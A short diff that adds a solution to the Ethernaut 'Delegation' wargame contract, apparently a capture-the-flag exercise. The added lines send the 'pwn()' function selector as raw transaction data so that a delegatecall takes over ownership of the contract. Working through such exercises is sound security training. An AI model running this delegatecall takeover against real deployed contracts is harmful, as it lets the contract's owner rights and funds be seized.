@@ -31,3 +31,8 @@ contract Delegation {
     }
   }
 }
+
+// SOLUTION
+//can be done on ethernaut console
+var payload = web3.utils.keccak256("pwn()");
+await contract.sendTransaction({data:payload})
